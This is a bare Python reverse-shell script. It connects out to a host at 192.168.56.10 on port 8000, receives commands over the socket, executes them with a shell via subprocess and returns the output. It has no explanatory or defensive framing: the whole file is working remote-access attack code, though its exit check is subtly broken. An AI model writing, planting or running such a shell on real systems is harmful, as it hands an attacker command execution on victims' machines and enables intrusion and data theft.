import socket ,subprocess

target_host = '192.168.56.10'

target_port = 8000

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect((target_host,target_port))

def run_command(command):

    command = command.rstrip()
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT,shell=True)
    except:
        output = b"[-] Filed execute command"
    return output
while True:
    command = client_socket.recv(1024)
    if command == b" " :
        client_socket.send(b' ')
    else:
        output = run_command(command.decode())
        if len(output) == 0:
            client_socket.send(b' ')
        else:
            client_socket.send(output)
    if command == 'exit':
        break


